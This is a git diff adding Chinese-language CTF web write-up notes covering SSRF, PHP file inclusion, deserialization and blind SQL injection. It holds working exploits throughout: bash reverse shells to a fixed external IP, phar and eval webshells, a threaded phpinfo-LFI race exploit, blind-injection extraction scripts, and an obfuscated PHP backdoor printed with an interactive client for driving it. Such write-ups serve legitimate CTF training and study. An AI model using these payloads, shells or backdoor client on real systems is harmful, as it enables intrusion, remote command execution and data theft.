@@ -2646,3 +2646,1037 @@ if __name__ == "__main__":
     key = '6cfe0f4d060c99a465a09d6fc98294d8'
     print(encode(key, payload))
 ```
+
+## 原型链污染
+
+1.lodash库 [Code-Breaking 2018 Thejs](https://www.freebuf.com/articles/web/200406.html)
+
+2.构造原型属性 [redpwnctf-web-blueprint](https://www.cnblogs.com/tr1ple/p/11360881.html)
+
+3.CVE-2019-10795 undefsafe原型链污染 [notes网鼎杯2020青龙组](http://www.gem-love.com/websecurity/2322.html)
+
+
+## wdb_白虎——picdown
+
+1. 输入 ` file:///proc/self/cmdline`可以看见`Python\x00/app/app.py`源码，file前加空格绕过源码前端白名单
+2. 审计源码，发现有个backdoor函数，校验key是否相同并且有cmd命令执行
+
+```
+from flask import Flask
+from flask import render_template
+from flask import request
+import os
+import urllib
+import random
+
+app = Flask(__name__)
+
+key_path = "/tmp/.secret_key"
+f = open(key_path, "r")
+secret_key = f.read()
+app.logger.info('secret_key: %s', secret_key)
+os.remove(key_path)
+
+def random_string(length=0x10, charset=__import__('string').ascii_letters + __import__('string').digits):
+    import random
+    return ''.join([random.choice(charset) for _ in range(length)])
+
+def download(url, path):
+    with open(path, "wb") as f:
+        f.write(urllib.urlopen(url).read())
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'GET':
+        return render_template('index.html')
+    if request.method == 'POST':
+        url = request.form['url']
+        if url.startswith("file://"):
+            return "Hacker!"
+        else:
+            try:
+                filename = "{}.png".format(random_string(0x20))
+                path = "./static/{}".format(filename)
+                download(url, path)
+                return "<script>window.location='/static/{}'</script>".format(filename)
+            except Exception as e:
+                return repr(e)
+                print(repr(e))
+                return "Something wrong!"
+    return 
+
+@app.route('/707b4fb4-7dcd-4699-b763-c96536c59004')
+def backdoor():
+    key = request.args.get('key', '').strip()
+    cmd = request.args.get('cmd', '')
+    if key == secret_key.strip():
+        return "{}".format(os.system(cmd))
+    else:
+        return "Incorrect Key! {}\n {}".format(key, secret_key)
+
+app.run("0.0.0.0", 3000)
+```
+3.但是/tmp/.secretkey生成后立马被删除，所以访问` file://proc/self/fd/3`访问标准输出，可以得到key
+4.反弹shell,vps监听8899端口，执行payload
+```
+//cmd = bash -c 'bach -i > /dev/tcp/118.24.240.40 0>&1' 外面包一层bash -c可以防止终端不是bash的环境
+?key=0c357d8f-93b0-497d-83be-5145fac146bd&cmd=bash%20-c%20'bash%20-i%20%3e%20%2fdev%2ftcp%2f118.24.240.40%2f8899%200%3e%261'
+```
+这里不能直接cmd=ls，因为Python返回的是执行结果的状态码
+
+## wangyihang inclusion --05
+
+1. 访问upload.php源码
+
+```
+<?php
+
+if ($_FILES["file"]["error"] === UPLOAD_ERR_OK) {
+    $path = "upload/".trim(file_get_contents('/proc/sys/kernel/random/uuid')).".txt";
+    move_uploaded_file(
+        $_FILES["file"]["tmp_name"],
+        $path
+    );
+    echo '<a>'.$path.'</a>';
+}
+?>
+```
+2.生成phar文件
+```
+<?php
+class X
+{
+    public function __destruct()
+    {
+        echo '_dectrcut';
+    }
+}
+@unlink('c.phar');
+$phar = new Phar("c.phar"); //后缀名必须为 phar
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置 stub
+$o = new X();
+$phar->setMetadata($o); //将自定义的 meta-data 存入 manifest
+$phar->addFromString("boc.php", '<?php eval($_REQUEST["c"]);'); //添加要压缩的文件
+//签名自动计算
+$phar->stopBuffering();
+```
+3.上传c.phar，生成upload路径，最终payload
+```
+http://train.overflow.host:20005/?page=phar://upload/79c6bfd0-6bdf-434e-affa-46885eee7efc.txt/boc&c=system("cat /196e94bc-76c9-4225-8dfc-4652ce22645e.flag");
+```
+
+## wangyihang inclusion -- 06
+
+```
+<?php
+
+session_start();
+
+$file = $_GET['file'];
+
+if (isset($file)) {
+    include $file;
+} else {
+    show_source(__FILE__);
+}
+
+$secret = $_GET['secret'];
+if (isset($secret)) {
+    $_SESSION['secret'] = $secret;
+}
+/* phpinfo.php */ 
+```
+
+payload: http://train.overflow.host:20006/?file=/tmp/sess_6c50d4b52d8680d22328f6eafe2ababd&secret=%3C?php%20system(%22cat%20/flag%22);?%3E
+
+## wangyihang inclusion -- 07
+
+远程文件包含
+
+```
+//方案一：vps上开启php服务0.0.0.0:8080，新建一句话webshell
+?file=http://118.24.240.40:1122//webshell&1=phpinfo();
+
+方案二
+?file=php://inpyt&1=phpinfo();
+
+post: <?php eval($_REQUEST[1]);?>
+```
+![image](http://note.youdao.com/yws/res/2035/C24746A9A8A54E4C85F1236BA798954C)
+
+
+## wangyihang inclusion --09
+
+1.会把所有上传的内容转成0o
+
+```
+<?php
+
+function random_string($length) {
+	return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
+}
+
+if($_FILES['file']){
+	$target_dir = "upload/";
+	$filename = md5(random_string(0x20)).'.php';
+	$path = $target_dir.$filename;
+	$content = preg_replace(
+		'/[^0o]/',
+		'',
+		file_get_contents($_FILES['file']['tmp_name'])
+	);
+	file_put_contents(
+		$path,
+		$content
+	);
+	die('File: '.$path.' uploaded!');
+}
+?>
+```
+2.下面脚本通过多次base64_docode转换出更多可见字符，经过多次decode
+
+```
+# coding=utf-8
+
+import string
+import itertools
+import os
+
+base64_chars = string.letters + string.digits + "+/"
+
+
+def robust_base64_decode(data):
+    robust_data = ""
+    base64_charset = string.letters + string.digits + "+/"
+    for i in data:
+        if i in base64_charset:
+            robust_data += i
+    robust_data += "=" * (4 - len(robust_data) % 4)
+    return robust_data.decode("base64").replace("\n", "")
+
+
+def robust_base64_encode(data):
+    return data.encode("base64").replace("\n", "").replace("=", "")
+
+
+def enmu_table(allow_chars):
+    possible = list(itertools.product(allow_chars, repeat=4))
+    table = {}
+    for list_data in possible:
+        data = "".join(list_data)
+        decoded_data = data.decode("base64")
+        counter = 0
+        t = 0
+        for x in decoded_data:
+            if x in base64_chars:
+                counter += 1
+                t = x
+        if counter == 1:
+            table[t] = data
+    return table
+
+
+def generate_cipher(tables, data):
+    encoded = robust_base64_encode(data)
+    result = encoded
+    for d in tables[::-1]:
+        encoded = result
+        result = ""
+        for i in encoded:
+            result += d[i]
+    return result
+
+
+def enmu_tables(allow_chars):
+    filename = "".join(allow_chars)
+    tables = []
+    saved_length = 0
+    flag = True
+    while True:
+        table = enmu_table(allow_chars)
+        length = len(table.keys())
+        if saved_length == length:
+            flag = False
+            break
+        saved_length = length
+        # print "[+] %d => %s" % (length, table)
+        print "[+] Got %d chars : %s" % (length, table.keys())
+        tables.append(table)
+        allow_chars = table.keys()
+        if set(table.keys()) >= set(base64_chars):
+            break
+    if flag:
+        return tables
+    return False
+
+
+def main():
+    data = "<?php eval($_GET[1]);?>"
+    print "[+] Base64 chars : %s" % (base64_chars)
+    print "[+] Plain : %s" % (data)
+    chars = "0o"
+    print "[+] Start charset : [%s]" % (chars)
+    filename = chars
+    print "[+] Generating tables..."
+    tables = enmu_tables(set(chars))
+    if tables:
+        print "[+] Trying to encode data..."
+        cipher = generate_cipher(tables, data)
+        with open(filename, "w") as f:
+            f.write(cipher)
+            print "[+] The encoded data is saved to file (%d Bytes) : %s" % (len(cipher), filename)
+        command = "php -r 'include(\"" + "php://filter/convert.base64-decode/resource=" * (
+            len(tables) + 1) + "%s\");'" % (filename)
+        print "[+] Usage : %s" % (command)
+        print "[+] Executing..."
+        os.system(command)
+    else:
+        print "[-] Failed : %s" % (tables)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+![image](http://note.youdao.com/yws/res/1994/498959EF5BA4426585B2A1F11DE26BF9)
+3.上传生成的0o文件，访问url，最终payload
+
+```
+http://train.overflow.host:20009/index.php?action=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=php://filter/convert.base64-decode/resource=upload/db672eb3c9cfe55a8cbfd83f9ddbd12c&1=system(%27cat%20/flag%27);
+```
+
+## wangyihang inclusion --02
+
+[一航师傅的博客](https://www.jianshu.com/p/dfd049924258)
+
+## inclusion --03
+
+https://www.cnblogs.com/xiaoqiyue/p/10158702.html
+
+往phpinfo页面post文件，
+
+在给PHP发送POST数据包时，如果数据包里包含文件区块，无论访问的代码中是否有处理文件上传的逻辑，php都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），这个临时文件在请求结束后就会被删除，同时，phpinfo页面会将当前请求上下文中所有变量都打印出来。但是文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，将这个文件名发送给文件包含漏洞页面。
+
+因为在第一个请求结束时，临时文件就会被删除，第二个请求就无法进行包含。
+
+但是这并不代表我们没有办法去利用这点上传恶意文件，只要发送足够多的数据，让页面还未反应过来，就上传我们的恶意文件，然后文件包含：
+
+1）发送包含了webshell的上传数据包给phpinfo，这个数据包的header，get等位置一定要塞满垃圾数据；
+
+2）phpinfo这时会将所有数据都打印出来，其中的垃圾数据会将phpinfo撑得非常大
+
+3）PHP默认缓冲区大小是4096，即PHP每次返回4096个字节给socket连接
+
+4）所以，我们直接操作原生socket，每次读取4096个字节，只要读取到的字符里包含临时文件名，就立即发送第二个数据包
+
+5）此时，第一个数据包的socket连接其实还没有结束，但是PHP还在继续每次输出4096个字节，所以临时文件还未被删除
+
+6）我们可以利用这个时间差，成功包含临时文件，最后getshell
+
+利用这个[exp.py](https://github.com/vulhub/vulhub/blob/master/php/inclusion)
+
+```
+#!/usr/bin/python 
+import sys
+import threading
+import socket
+
+def setup(host, port):
+    TAG="Security Test"
+    PAYLOAD="""%s\r
+<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>\r""" % TAG
+    REQ1_DATA="""-----------------------------7dbff1ded0714\r
+Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
+Content-Type: text/plain\r
+\r
+%s
+-----------------------------7dbff1ded0714--\r""" % PAYLOAD
+    padding="A" * 5000
+    REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
+Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
+HTTP_ACCEPT: """ + padding + """\r
+HTTP_USER_AGENT: """+padding+"""\r
+HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
+HTTP_PRAGMA: """+padding+"""\r
+Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
+Content-Length: %s\r
+Host: %s\r
+\r
+%s""" %(len(REQ1_DATA),host,REQ1_DATA)
+    #modify this to suit the LFI script   
+    LFIREQ="""GET /?file=%s HTTP/1.1\r
+User-Agent: Mozilla/4.0\r
+Proxy-Connection: Keep-Alive\r
+Host: %s\r
+\r
+\r
+"""
+    return (REQ1, TAG, LFIREQ)
+
+def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
+
+    s.connect((host, port))
+    s2.connect((host, port))
+
+    s.send(phpinforeq)
+    d = ""
+    while len(d) < offset:
+        d += s.recv(offset)
+    try:
+        i = d.index("[tmp_name] =&gt; ")
+        fn = d[i+17:i+31]
+    except ValueError:
+        return None
+
+    s2.send(lfireq % (fn, host))
+    d = s2.recv(4096)
+    s.close()
+    s2.close()
+
+    if d.find(tag) != -1:
+        return fn
+
+counter=0
+class ThreadWorker(threading.Thread):
+    def __init__(self, e, l, m, *args):
+        threading.Thread.__init__(self)
+        self.event = e
+        self.lock =  l
+        self.maxattempts = m
+        self.args = args
+
+    def run(self):
+        global counter
+        while not self.event.is_set():
+            with self.lock:
+                if counter >= self.maxattempts:
+                    return
+                counter+=1
+
+            try:
+                x = phpInfoLFI(*self.args)
+                if self.event.is_set():
+                    break                
+                if x:
+                    print "\nGot it! Shell created in /tmp/g"
+                    self.event.set()
+                    
+            except socket.error:
+                return
+    
+
+def getOffset(host, port, phpinforeq):
+    """Gets offset of tmp_name in the php output"""
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host,port))
+    s.send(phpinforeq)
+    
+    d = ""
+    while True:
+        i = s.recv(4096)
+        d+=i        
+        if i == "":
+            break
+        # detect the final chunk
+        if i.endswith("0\r\n\r\n"):
+            break
+    s.close()
+    i = d.find("[tmp_name] =&gt; ")
+    if i == -1:
+        raise ValueError("No php tmp_name in phpinfo output")
+    
+    print "found %s at %i" % (d[i:i+10],i)
+    # padded up a bit
+    return i+256
+
+def main():
+    
+    print "LFI With PHPInfo()"
+    print "-=" * 30
+
+    if len(sys.argv) < 2:
+        print "Usage: %s host [port] [threads]" % sys.argv[0]
+        sys.exit(1)
+
+    try:
+        host = socket.gethostbyname(sys.argv[1])
+    except socket.error, e:
+        print "Error with hostname %s: %s" % (sys.argv[1], e)
+        sys.exit(1)
+
+    port=80
+    try:
+        port = int(sys.argv[2])
+    except IndexError:
+        pass
+    except ValueError, e:
+        print "Error with port %d: %s" % (sys.argv[2], e)
+        sys.exit(1)
+    
+    poolsz=10
+    try:
+        poolsz = int(sys.argv[3])
+    except IndexError:
+        pass
+    except ValueError, e:
+        print "Error with poolsz %d: %s" % (sys.argv[3], e)
+        sys.exit(1)
+
+    print "Getting initial offset...",  
+    reqphp, tag, reqlfi = setup(host, port)
+    offset = getOffset(host, port, reqphp)
+    sys.stdout.flush()
+
+    maxattempts = 1000
+    e = threading.Event()
+    l = threading.Lock()
+
+    print "Spawning worker pool (%d)..." % poolsz
+    sys.stdout.flush()
+
+    tp = []
+    for i in range(0,poolsz):
+        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))
+
+    for t in tp:
+        t.start()
+    try:
+        while not e.wait(1):
+            if e.is_set():
+                break
+            with l:
+                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
+                sys.stdout.flush()
+                if counter >= maxattempts:
+                    break
+        print
+        if e.is_set():
+            print "Woot!  \m/"
+        else:
+            print ":("
+    except KeyboardInterrupt:
+        print "\nTelling threads to shutdown..."
+        e.set()
+    
+    print "Shuttin' down..."
+    for t in tp:
+        t.join()
+
+if __name__=="__main__":
+    main()
+```
+
+![image](http://note.youdao.com/yws/res/2013/6679FDC097C942F1ABD2D5D07B04CB71)
+
+可以看见在199个文件时上传成功，payload:
+
+```
+http://train.overflow.host:20003/?file=/tmp/g&1=system(%27cat%20/836b85d4-e871-4cb0-8b71-db1e2e735195.flag%27);
+```
+
+## wangyihang inclusion -- 04
+
+下载源码，发现登陆可绕过
+```
+<?php
+    $admin_hash = "df650edd89a1abfb417124133daf4c103e6d2e97";
+	if(isset($_POST['username']) && isset($_POST['password'])){
+		$username = $_POST['username'];
+		$password = $_POST['password'];
+		if ($username === "admin" && sha1(md5($password)) === $admin_hash){
+			echo '<script>alert("Login seccess!");</script>';
+		}else{
+			if (isset($_GET['debug'])){
+				if($_GET['debug'] === 'hitctf'){
+					$logfile = "log/".$username.".log";
+					$content = $password;
+					file_put_contents($logfile, $content);
+
+				}else{
+					echo '<script>alert("Login failed!");</script>';
+				}
+			}else{
+				echo '<script>alert("Login failed!");</script>';
+			}
+		}
+	}else{
+		echo '<script>alert("Please input username and password!");</script>';
+	}
+?>
+```
+
+将前几题的c.phar进行url编码，post
+
+![image](http://note.youdao.com/yws/res/2026/5A7D952E3A9946128169E7174C6ACE41)
+
+![image](http://note.youdao.com/yws/res/2024/E51D14DED22949B7BF5F918E38432F2F)
+
+访问?page=phar://log/admin.log/boc&c=phpinfo();
+
+## wangyihang rce-01
+
+`/etc/passwd | bash -c "bash -i >& /dev/tcp/118.24.240.40/7777  0>&1"`
+
+## d-5-web5
+
+盲注，二分法，union、and、or等被过滤，空格也被过滤，空格可以用()代替
+
+https://www.cnblogs.com/20175211lyz/p/11435298.html
+
+```
+import hashlib
+import string
+import requests
+
+url='http://39.100.39.157:8303/index.php'
+
+payload = {
+    "id" : ""
+}
+result = ""
+for i in range(1,100):
+    l = 33
+    r =130
+    mid = (l+r)>>1
+    while(l<r):
+        payload["id"] = "0^" + "(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i,mid)
+        html = requests.post(url,data=payload)
+        print(payload)
+        if "Hello" in html.text:
+            l = mid+1
+        else:
+            r = mid
+        mid = (l+r)>>1
+    if(chr(mid)==" "):
+        break
+    result = result + chr(mid)
+    print(result)
+print("flag: " ,result)
+
+
+```
+
+自己写的脚本，不用二分法也可以，就是慢一点
+
+```
+import hashlib
+import string
+import requests
+
+url='http://39.100.39.157:8303/index.php'
+
+payload = {
+    "id" : ""
+}
+
+temp = ''
+for i in xrange(1, 50):
+    for p in xrange(32, 126+1):
+        payload['id'] = "0^" + "(ascii(substr((select(flag)from(flag)),{0},1))={1})".format(i,p)
+        
+        html = requests.post(url,data=payload).text
+        if 'hello' in html:
+            temp += chr(p)
+            print(temp)
+            break
+```
+
+## web-6
+
+.index.php源码
+
+![image](http://note.youdao.com/yws/res/1045/3710A95B9A4E44F1B137FA209E6232BA)
+
+## ZJCTF NiZhuanSiWei
+
+```
+ <?php  
+$text = $_GET["text"];
+$file = $_GET["file"];
+$password = $_GET["password"];
+if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
+    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+    if(preg_match("/flag/",$file)){
+        echo "Not now!";
+        exit(); 
+    }else{
+        include($file);  //useless.php
+        $password = unserialize($password);
+        echo $password;
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+?> 
+```
+
+构造?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php
+
+传入text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= 绕过welcome to the zjctf
+
+用filter读取源码
+
+```
+class Flag{  //flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    }  
+}  
+
+$file = new Flag();
+$file->file = 'flag.php';
+echo serialize($file);
+```
+
+最终：http://45.13.244.211/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+
+## 5.1日 web2
+
+https://forum.90sec.com/t/topic/397
+
+https://github.com/tarunkant/Gopherus
+
+无需密码认证时直接发送TCP/IP数据包，gopher协议进行mysql认证
+
+![image](http://note.youdao.com/yws/res/1567/C6E7229E2D2A4908A212C0CF77D977A5)
+
+需要进行url编码 
+![image](http://note.youdao.com/yws/res/1570/C5EE46FD5BE442D589A47DC19D665DFA)
+
+sql ：
+
+1.show databases;
+
+2.select group_concat(table_name) from information_schema.tables where table_schema='fla4441111g'
+
+3.SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE table_schema = 'fla4441111g' AND table_name = 'F1111llllggggg'
+
+4.select flag from fla4441111g.F1111llllggggg
+
+## Web_php_wrong_nginx_config(攻防世界)
+
+1.robots.txt发现hack.php和hint.php,hint.php提示etc/nginx/sites-enabled/site.conf
+
+2.利用/admin/admin.php?file=..././..././..././..././etc/nginx/sites-enabled/site.conf&ext=读取文件内容，发现web-img存在文件遍历
+
+![image](http://note.youdao.com/yws/res/1585/B505AF8F2C854B118B74F97775C9FCB2)
+
+3.访问http://124.126.19.106:59345/web-img../var/www/，下载hack.php.bak，打印$f得到源码
+
+```
+<?php
+$kh="42f7";
+$kf="e9ac";
+function x($t,$k) {
+	$c=strlen($k);
+	$l=strlen($t);
+	$o="";
+	for ($i=0;$i<$l;) {
+		for ($j=0;($j<$c&&$i<$l);$j++,$i++) {
+			$o.=$t {
+				$i
+			}
+			^$k {
+				$j
+			}
+			;
+		}
+	}
+	return $o;
+}
+$r=$_SERVER;
+$rr=@$r["HTTP_REFERER"];
+$ra=@$r["HTTP_ACCEPT_LANGUAGE"];
+if($rr&&$ra) {
+	$u=parse_url($rr);
+	parse_str($u["query"],$q);
+	$q=array_values($q);
+	preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/",$ra,$m);
+	if($q&&$m) {
+		@session_start();
+		$s=&$_SESSION;
+		$ss="substr";
+		$sl="strtolower";
+		$i=$m[1][0].$m[1][1];
+		$h=$sl($ss(md5($i.$kh),0,3));
+		$f=$sl($ss(md5($i.$kf),0,3));
+		$p="";
+		for ($z=1;$z<count($m[1]);$z++)$p.=$q[$m[2][$z]];
+		if(strpos($p,$h)===0) {
+			$s[$i]="";
+			$p=$ss($p,3);
+		}
+		if(array_key_exists($i,$s)) {
+			$s[$i].=$p;
+			$e=strpos($s[$i],$f);
+			if($e) {
+				$k=$kh.$kf;
+				ob_start();
+				@eval(@gzuncompress(@x(@base64_decode(preg_replace(array("/_/","/-/"),array("/","+"),$ss($s[$i],0,$e))),$k)));
+				$o=ob_get_contents();
+				ob_end_clean();
+				$d=base64_encode(x(gzcompress($o),$k));
+				print("<$k>$d</$k>");
+				@session_destroy();
+			}
+		}
+	}
+}
+
+```
+
+4.找到一个后门利用的脚本，根据题目修改后的脚本(修改了密钥和url)如下:
+
+```
+# encoding: utf-8
+
+from random import randint,choice
+from hashlib import md5
+import urllib
+import string
+import zlib
+import base64
+import requests
+import re
+
+def choicePart(seq,amount):
+    length = len(seq)
+    if length == 0 or length < amount:
+        print 'Error Input'
+        return None
+    result = []
+    indexes = []
+    count = 0
+    while count < amount:
+        i = randint(0,length-1)
+        if not i in indexes:
+            indexes.append(i)
+            result.append(seq[i])
+            count += 1
+            if count == amount:
+                return result
+
+def randBytesFlow(amount):
+    result = ''
+    for i in xrange(amount):
+        result += chr(randint(0,255))
+    return  result
+
+def randAlpha(amount):
+    result = ''
+    for i in xrange(amount):
+        result += choice(string.ascii_letters)
+    return result
+
+def loopXor(text,key):
+    result = ''
+    lenKey = len(key)
+    lenTxt = len(text)
+    iTxt = 0
+    while iTxt < lenTxt:
+        iKey = 0
+        while iTxt<lenTxt and iKey<lenKey:
+            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))
+            iTxt += 1
+            iKey += 1
+    return result
+
+
+def debugPrint(msg):
+    if debugging:
+        print msg
+
+# config
+debugging = False
+keyh = "42f7" # $kh
+keyf = "e9ac" # $kf
+xorKey = keyh + keyf
+url = 'http://111.198.29.45:46283/hack.php'
+defaultLang = 'zh-CN'
+languages = ['zh-TW;q=0.%d','zh-HK;q=0.%d','en-US;q=0.%d','en;q=0.%d']
+proxies = None # {'http':'http://127.0.0.1:8080'} # proxy for debug
+
+sess = requests.Session()
+
+# generate random Accept-Language only once each session
+langTmp = choicePart(languages,3)
+indexes = sorted(choicePart(range(1,10),3), reverse=True)
+
+acceptLang = [defaultLang]
+for i in xrange(3):
+    acceptLang.append(langTmp[i] % (indexes[i],))
+acceptLangStr = ','.join(acceptLang)
+debugPrint(acceptLangStr)
+
+init2Char = acceptLang[0][0] + acceptLang[1][0] # $i
+md5head = (md5(init2Char + keyh).hexdigest())[0:3]
+md5tail = (md5(init2Char + keyf).hexdigest())[0:3] + randAlpha(randint(3,8))
+debugPrint('$i is %s' % (init2Char))
+debugPrint('md5 head: %s' % (md5head,))
+debugPrint('md5 tail: %s' % (md5tail,))
+
+# Interactive php shell
+cmd = raw_input('phpshell > ')
+while cmd != '':
+    # build junk data in referer
+    query = []
+    for i in xrange(max(indexes)+1+randint(0,2)):
+        key = randAlpha(randint(3,6))
+        value = base64.urlsafe_b64encode(randBytesFlow(randint(3,12)))
+        query.append((key, value))
+    debugPrint('Before insert payload:')
+    debugPrint(query)
+    debugPrint(urllib.urlencode(query))
+
+    # encode payload
+    payload = zlib.compress(cmd)
+    payload = loopXor(payload,xorKey)
+    payload = base64.urlsafe_b64encode(payload)
+    payload = md5head + payload
+
+    # cut payload, replace into referer
+    cutIndex = randint(2,len(payload)-3)
+    payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail)
+    iPiece = 0
+    for i in indexes:
+        query[i] = (query[i][0],payloadPieces[iPiece])
+        iPiece += 1
+    referer = url + '?' + urllib.urlencode(query)
+    debugPrint('After insert payload, referer is:')
+    debugPrint(query)
+    debugPrint(referer)
+
+    # send request
+    r = sess.get(url,headers={'Accept-Language':acceptLangStr,'Referer':referer},proxies=proxies)
+    html = r.text
+    debugPrint(html)
+
+    # process response
+    pattern = re.compile(r'<%s>(.*)</%s>' % (xorKey,xorKey))
+    output = pattern.findall(html)
+    if len(output) == 0:
+        print 'Error,  no backdoor response'
+        cmd = raw_input('phpshell > ')
+        continue
+    output = output[0]
+    debugPrint(output)
+    output = output.decode('base64')
+    output = loopXor(output,xorKey)
+    output = zlib.decompress(output)
+    print output
+    cmd = raw_input('phpshell > ')
+
+```
+
+![image](http://note.youdao.com/yws/res/1601/6724CDBAFFC24F0E8C96A27241F1A5A5)
+
+## 安恒4月赛-Ezunserialize
+
+```
+<?php
+// show_source("index.php");
+function write($data)
+{
+    return str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data);
+}
+function read($data)
+{
+    return str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
+}
+class A
+{
+    public $username;
+    public $password;
+    public function __construct($a, $b)
+    {
+        $this->username = $a;
+        $this->password = $b;
+    }
+}
+class B
+{
+    public $b = 'gqy';
+    public function __destruct()
+    {
+        $c = 'a'.$this->b;
+        echo $c;
+    }
+}
+class C
+{
+    public $c;
+    public function __toString()
+    {
+        //flag.php
+        echo file_get_contents($this->c);
+        return 'nice';
+    }
+}
+
+$a = new A();
+// //省略了存储序列化数据的过程,下面是取出来并反序列化的操作
+$b = unserialize(read(write(serialize($a))));
+```
+
+构造pop链条
+
+```
+$b = new B();
+$c = new C();
+$c->c = 'flag.php';
+$b->b = $c; //当B对象里的b属性字符串拼接了其他类型的变量时，会自动调用c对象的tostring方法
+$x = serialize($b);
+echo strlen($x); //序列化后的长度为55
+echo $x; //O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}} 
+```
+
+当A对象通过write和read函数后，最后的变量的长度不符，存在字符串逃逸的漏洞
+![image](http://note.youdao.com/yws/res/1619/7110947EA50946B7B35305A57CAF74B7)
+
+*左右都有不可见字符%00，意味着chr(0).'*'.chr(0)为3个字节
+
+构造payload:
+```
+$a = new A('\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0', '1";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}};}');
+```
+
+![image](http://note.youdao.com/yws/res/1633/F98F9F7D96BA4125A7572E67354631DC)
+
+打印出的结果，利用字段逃逸补全后面缺的48-24个字节的位置，让password属性执行B对象
+
+## babytricks
+
+提示
+
+```
+select * from user where user='$user' and passwd='%s'
+```
+
+sprinf格式化字符串漏洞
+
+它可以吃掉一个转义符, 如果%后面出现一个,那么php会把\当作一个格式化字符的类型而吃掉, 最后%\（或%1$\）被替换为空
+
+https://www.cnblogs.com/test404/p/7821884.html
+
+%1$将单引号给吞了，从而实现类似于’转义单引号的注入,前面经过测试，过滤了or 我们可以用异或来进行sql注入
+
+payload: user=%1$&passwd=^1^1#
+
+查询用户名：user=%1$&passwd=^(ascii(substr((user),1,1))>1)#
+
+查询密码：user=%1$&passwd=^(ascii(substr((passwd),1,1))>1)#
+
+得出密码后登陆后台
+preg_match $0 代表完整的模式匹配文本
+![image](http://note.youdao.com/yws/res/1652/49D7CA13BE204AD3BC758E4AF5575C09)
+
+https://blog.csdn.net/SopRomeo/article/details/105849403
